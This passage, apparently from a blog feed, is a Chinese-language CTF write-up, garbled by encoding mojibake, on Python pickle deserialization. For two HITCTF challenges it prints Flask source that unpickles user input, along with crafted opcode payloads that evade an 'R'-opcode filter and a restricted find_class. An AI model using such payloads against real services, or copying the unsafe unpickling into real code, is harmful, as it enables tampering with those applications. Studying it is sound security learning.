        <content type="html"><![CDATA[<h1 id="é¢„å¤‡çŸ¥è¯†ï¼špythonã€pickleã€stackã€é¢å‘å¯¹è±¡åŸºç¡€"><a href="#é¢„å¤‡çŸ¥è¯†ï¼špythonã€pickleã€stackã€é¢å‘å¯¹è±¡åŸºç¡€" class="headerlink" title="é¢„å¤‡çŸ¥è¯†ï¼špythonã€pickleã€stackã€é¢å‘å¯¹è±¡åŸºç¡€"></a>é¢„å¤‡çŸ¥è¯†ï¼špythonã€pickleã€stackã€é¢å‘å¯¹è±¡åŸºç¡€</h1><p>è‡´æ•¬ï¼š<a href="https://zhuanlan.zhihu.com/p/89132768">ä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ &amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿</a><br>æ³¨æ„ï¼šæ­¤ç¯‡æ–‡ç« éœ€å…ˆé€šè¯»æ–‡ç« é“¾æ¥ä¸­çš„ä¸€äº›åŸºç¡€æ¦‚å¿µï¼Œå¦åˆ™ç†è§£èµ·æ¥å¯èƒ½å­˜åœ¨å›°éš¾ï¼Œåœ¨å¯¹ä¾‹é¢˜è¿›è¡Œè®²è§£çš„è¿‡ç¨‹ä¸­ä¸ä¼š<strong>è¿‡å¤š</strong>é˜è¿°åŸºç¡€æ¦‚å¿µã€‚</p><h2 id="BBå‡ å¥"><a href="#BBå‡ å¥" class="headerlink" title="BBå‡ å¥"></a>BBå‡ å¥</h2><p>å…¶å®ä¹‹å‰æ²¡æ€ä¹ˆæ¥è§¦è¿‡python pickleæ¨¡å—çš„ååºåˆ—åŒ–ï¼Œæˆ–è€…è¯´æ²¡æ¥è§¦è¿‡ååºåˆ—åŒ–ï¼Œè¿™æ¬¡â€é«˜æ ¡æŠ—ç–«â€CTFçº¿ä¸Šèµ›ç»™æˆ‘ä¸Šäº†ä¸€è¯¾ã€‚<br>æœ‰ä¸€é“webtmpçš„é¢˜ç›®ï¼Œæ˜¯ä¸python pickleæ¨¡å—çš„ååºåˆ—åŒ–æœ‰å…³ï¼Œæˆ‘ä¹Ÿæ‰¾åˆ°äº†éå¸¸è¯¦ç»†çš„è§£æ(è‡´æ•¬éƒ¨åˆ†å·²è´´å‡º)ï¼Œä½†æ˜¯æ²¡æœ‰æ²‰ä¸‹å¿ƒè®¤çœŸåœ°å»ä¸€æ­¥æ­¥åœ°åšï¼Œæ‰€ä»¥è¿™é“é¢˜ä¹Ÿæ²¡æœ‰åšå‡ºæ¥ï¼Œå…¶å®è¿™é“é¢˜ä¸éš¾ï¼Œåšå‡ºæ¥çš„å¸ˆå‚…è¿˜æ˜¯å¾ˆå¤šçš„ã€‚<br>ç›¸åï¼Œå†…å­˜å–è¯çš„ä¸€é“é¢˜æˆ‘æ ¹æ®æ•™ç¨‹ä¸€æ­¥æ­¥åšå‡ºæ¥äº†ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¹‹å‰webæ²¡åšå‡ºæ¥è¿‡é¢˜å¯¼è‡´äº†è¿™ä¸ªç»“æœã€‚è¿˜éœ€åŠªåŠ›ï¼</p><h2 id="ç›¸å…³æ¦‚å¿µ"><a href="#ç›¸å…³æ¦‚å¿µ" class="headerlink" title="ç›¸å…³æ¦‚å¿µ"></a>ç›¸å…³æ¦‚å¿µ</h2><p>å»ºè®®<strong>é€šè¯»</strong> è‡´æ•¬æ–‡ç« ã€‚<br>éœ€è¦æ˜ç¡®çš„æ¦‚å¿µï¼š<br>æ•°æ®ç»“æ„â€“æ ˆã€‚<br>pythonæ•°æ®ç±»å‹ï¼šlistã€tupleã€dict <a href="https://zhuanlan.zhihu.com/p/59740559">Pythonä¸­listï¼ˆåˆ—è¡¨ï¼‰ã€dictï¼ˆå­—å…¸ï¼‰ã€tupleï¼ˆå…ƒç»„ï¼‰ã€setï¼ˆé›†åˆï¼‰è¯¦ç»†ä»‹ç»</a><br>pickleã€pickletools ï¼šè¯¦è§è‡´æ•¬éƒ¨åˆ†é“¾æ¥ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><h3 id="ç¬¬ä¸€é¢˜ï¼š"><a href="#ç¬¬ä¸€é¢˜ï¼š" class="headerlink" title="ç¬¬ä¸€é¢˜ï¼š"></a>ç¬¬ä¸€é¢˜ï¼š</h3><p><img src="/img/181.png"><br>é¢˜ç›®é“¾æ¥ï¼š<a href="http://web.hitctf.cn:10018/">HITCTF</a><br>é¢˜ç›®æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"><span class="keyword">import</span> pickletools,sys</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, category</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;source&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;No... I don\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = pickle.loads(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(result) <span class="keyword">is</span> <span class="keyword">not</span> Animal:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Are you sure that is an animal???&#x27;</span></span><br><span class="line">            correct = (result == Animal(favorite.name, favorite.category))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_result.html&#x27;</span>, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something wrong...&#x27;</span></span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(<span class="string">&#x27;kitty&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_page.html&#x27;</span>, sample_obj=sample_obj, pickle_data=pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>é¢˜ç›®çš„è¦æ±‚æ˜¯,ä¼ å…¥ä¸€ä¸ªç»è¿‡base64åŠ å¯†çš„pickleåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œåœ¨æœåŠ¡å™¨ç«¯å¯¹è¯¥å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œå¦‚æœä¸åŒ…å«RæŒ‡ä»¤ç å¹¶ä¸”è§£æåçš„å¯¹è±¡ç±»å‹ä¸ºAnimalï¼Œå¹¶ä¸”ä¸å…¶è§„å®šçš„<strong>favorite</strong>å¯¹è±¡çš„nameä¸categoryå±æ€§éƒ½ä¸€æ ·çš„è¯ï¼Œåˆ™å¯è·å¾—flagã€‚<br>å¯¹ä»£ç è¿›è¡Œå®¡è®¡ï¼Œè§‚å¯Ÿç¬¬34è¡Œï¼Œè¿‡æ»¤äº†RæŒ‡ä»¤ç ï¼Œå³å µä¸Šäº†RCEè¿™æ¡è·¯ã€‚<br>ç»§ç»­åˆ†æï¼Œå‘ç°å¹¶æ²¡æœ‰é‡å†™find_classæ–¹æ³•ï¼Œå³å¯ä»¥é€šè¿‡å¼•å…¥favorite.name å’Œfavorite.categoryçš„æ–¹æ³•é€šè¿‡åˆ¤å®šã€‚<br>å³ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">o1=Animal()</span><br><span class="line">o1.name=favorite.name</span><br><span class="line">o1.category=favorite.category</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ„é€ çš„å¯¹è±¡å¯ä»¥ä¿è¯é€šè¿‡**correct = (result == Animal(favorite.name, favorite.category))**è¿™å¥ä»£ç çš„åˆ¤å®šã€‚<br>æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯æ„é€ è¿™ç§å¯¹è±¡ã€‚<br>é€šè¿‡å¯¹æŒ‡ä»¤ç çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºè¿™ç§å¯¹è±¡ã€‚é¦–å…ˆæ„é€ æ­£å¸¸çš„animalå¯¹è±¡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,pickletools</span><br><span class="line">o1=Animal(<span class="string">&#x27;xx&#x27;</span>,<span class="string">&#x27;yy&#x27;</span>)</span><br><span class="line">normal=pickle.dumps(o1)<span class="comment">#è¿™æ˜¯æ­£å¸¸animalç»åºåˆ—åŒ–åçš„æ•°æ®,</span></span><br><span class="line">ser=<span class="string">b&#x27;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x02\x00\x00\x00xxq\x04X\x08\x00\x00\x00categoryq\x05X\x02\x00\x00\x00yyq\x06ub.&#x27;</span><span class="comment">#è¿™æ˜¯åºåˆ—åŒ–ä¹‹åçš„æ•°æ®ï¼ˆå­—ç¬¦ä¸²å½¢å¼ï¼‰å…¶å®å°±æ˜¯normalï¼Œæˆ‘æŠŠå®ƒæ‰“å°å‡ºæ¥äº†ã€‚</span></span><br><span class="line">pickletools.dis(normal)</span><br><span class="line"><span class="comment">#ä¸‹é¢ä¸ºpickletools.dis(normal)çš„ç»“æœ</span></span><br><span class="line"><span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;__main__ Animal&#x27;</span></span><br><span class="line">   <span class="number">19</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">21</span>: )    EMPTY_TUPLE</span><br><span class="line">   <span class="number">22</span>: \x81 NEWOBJ</span><br><span class="line">   <span class="number">23</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">25</span>: &#125;    EMPTY_DICT</span><br><span class="line">   <span class="number">26</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">28</span>: (    MARK</span><br><span class="line">   <span class="number">29</span>: X        BINUNICODE <span class="string">&#x27;name&#x27;</span></span><br><span class="line">   <span class="number">38</span>: q        BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">40</span>: X        BINUNICODE <span class="string">&#x27;xx&#x27;</span></span><br><span class="line">   <span class="number">47</span>: q        BINPUT     <span class="number">4</span></span><br><span class="line">   <span class="number">49</span>: X        BINUNICODE <span class="string">&#x27;category&#x27;</span></span><br><span class="line">   <span class="number">62</span>: q        BINPUT     <span class="number">5</span></span><br><span class="line">   <span class="number">64</span>: X        BINUNICODE <span class="string">&#x27;yy&#x27;</span></span><br><span class="line">   <span class="number">71</span>: q        BINPUT     <span class="number">6</span></span><br><span class="line">   <span class="number">73</span>: u        SETITEMS   (MARK at <span class="number">28</span>)</span><br><span class="line">   <span class="number">74</span>: b    BUILD</span><br><span class="line">   <span class="number">75</span>: .    STOP</span><br></pre></td></tr></table></figure><p>æ ¹æ®æ€è·¯ï¼Œåªéœ€è¦æŠŠ40 64æ ‡å·å¤„çš„å€¼æ›¿æ¢ä¸ºfavorite.nameã€favorite.categoryå³å¯ã€‚<br>æ–¹æ³•ï¼šä½¿ç”¨c(global)æŒ‡ä»¤å¼•å…¥æˆ‘ä»¬æ‰€éœ€çš„æ•°æ®ã€‚å³æŠŠâ€™xxâ€™ é€šè¿‡cæŒ‡ä»¤æ¢æˆfavorite.nameï¼Œâ€™yyâ€™æ¢æˆfavorite.category<br>å®ç°ï¼šæŠŠserä¸­xxä¸yyçš„ç¼–ç ä½¿ç”¨golbal favorite.xxæ›¿æ¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03cfavorite\nname\nq\x04X\x08\x00\x00\x00categoryq\x05cfavorite\ncategory\nq\x06ub.&#x27;</span></span><br></pre></td></tr></table></figure><p>Then,encode it!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆç»“æœ:<br>gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA2NmYXZvcml0ZQpuYW1lCnEEWAgAAABjYXRlZ29yeXEFY2Zhdm9yaXRlCmNhdGVnb3J5CnEGdWIu</p><h3 id="ç¬¬äºŒé¢˜"><a href="#ç¬¬äºŒé¢˜" class="headerlink" title="ç¬¬äºŒé¢˜"></a>ç¬¬äºŒé¢˜</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://web.hitctf.cn:10018/">HITCTF</a><br>é¢˜ç›®æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"><span class="keyword">import</span> favorite</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, category</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;source&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;No... I don\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(result) <span class="keyword">is</span> <span class="keyword">not</span> Animal:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Are you sure that is an animal???&#x27;</span></span><br><span class="line">            correct = (result == Animal(favorite.name, favorite.category))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_result.html&#x27;</span>, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Something wrong&quot;</span></span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(<span class="string">&#x27;kitty&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_page.html&#x27;</span>, sample_obj=sample_obj, pickle_data=pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¢˜ç›®åˆ†æï¼šç›¸æ¯”ä¸Šä¸€ä¸ªé¢˜ï¼Œè¯¥é¢˜å¤šäº†ä¸€ä¸ªfind_classæ–¹æ³•çš„é‡å†™ã€‚è§„å®šäº†moduleåªèƒ½æ˜¯mainä¸­çš„ï¼Œæ‰€ä»¥å°±æ— æ³•å¼•å…¥favoriteäº†ã€‚<br>è§£é¢˜æ€è·¯ï¼š<br>é€šè¿‡__main__.blueå¼•å…¥è¿™ä¸€ä¸ªmoduleï¼Œç”±äºå‘½åç©ºé—´è¿˜åœ¨mainå†…ï¼Œæ•…ä¸ä¼šè¢«æ‹¦æˆªã€‚<br>ç„¶åä¿®æ”¹å½“å‰å¼•å…¥å¯¹è±¡çš„å±æ€§ï¼Œè‡ªå®šä¹‰å³å¯ã€‚<br>ç„¶åæŠŠè¿™ä¸ªå¯¹è±¡å¼¹å‡ºï¼Œå†å‹å…¥ä¸€ä¸ªæ­£å¸¸çš„animalå¯¹è±¡ã€‚æ³¨æ„ï¼šè¯¥æ­£å¸¸å¯¹è±¡çš„å±æ€§å€¼é¡»ä¸ä½ åˆšæ‰è®¾å®šçš„å±æ€§å€¼ç›¸åŒã€‚<br>payload=bâ€™\x80\x03c__main__\nfavorite\n}(X\x04\x00\x00\x00nameX\x02\x00\x00\x00xxX\x08\x00\x00\x00categoryX\x02\x00\x00\x00yyub0c__main__\nAnimal\n)\x81}(X\x04\x00\x00\x00nameX\x02\x00\x00\x00xxX\x08\x00\x00\x00categoryX\x02\x00\x00\x00yyub.â€™<br>ç»è¿‡base64åŠ å¯†åæäº¤å³å¯ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ç±»é—®é¢˜åªèƒ½è¯´åˆæ­¥äº†è§£ï¼Œå…·ä½“è¿˜æœ‰å¾ˆå¤šç»†èŠ‚æ²¡æœ‰å¼„æ˜ç™½ã€‚è¿˜éœ€è¦è¿›ä¸€æ­¥å­¦ä¹ ã€‚<br>æœ€åä¸€é“é¢˜çš„payloadåœ¨å†™å®Œfavorite\nåå‹å…¥ä¸€ä¸ªç©ºdictåï¼ŒæŠŠå½“å‰æ ˆè¿™ä¸ªæ•´ä½“ï¼Œä½œä¸ºä¸€ä¸ªlistï¼Œå‹è¿›å‰åºæ ˆï¼ˆopcode: (ï¼ˆ ä¹Ÿå°±æ˜¯MARKæ“ä½œç¬¦ï¼‰ï¼‰ã€‚ä¹‹åçš„æ“ä½œå°±æ˜¯æ›´æ–°favorite.name å’Œfavorite.categoryåˆ†åˆ«ä¸ºxx å’Œyyã€‚å¯¹åº”X\x04\x00\x00\x00nameX\x02\x00\x00\x00xxX\x08\x00\x00\x00categoryX\x02\x00\x00\x00yyã€‚<br>ç„¶åuå°±æ˜¯å½¢æˆé”®å€¼å¯¹ï¼Œb-buildï¼ŒæŠŠå½“å‰é”®å€¼å¯¹çš„å€¼ç»™å‰åºæ ˆä¸­çš„å¯¹è±¡ã€‚è¿™æ ·å‰åŠéƒ¨åˆ†çš„æ“ä½œå°±å®Œæˆäº†ã€‚å¯¹è¯¥å¯¹è±¡ä¿®æ”¹å®Œä¹‹åç›´æ¥å¼¹å‡º(opcode : 0)ï¼Œä¸ç®¡ä»–äº†ï¼Œç„¶åå†æ’ä¸€ä¸ªæ­£ç»å¯¹è±¡ï¼Œå±æ€§å€¼ä¸€æ ·å°±OKã€‚</p>]]></content>
      
      
      <categories>
          
          <category> webåŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸‰æ¡å‘½ä»¤</title>
      <link href="2020/03/09/%E4%B8%89%E6%9D%A1%E5%91%BD%E4%BB%A4/"/>
      <url>2020/03/09/%E4%B8%89%E6%9D%A1%E5%91%BD%E4%BB%A4/</url>
      
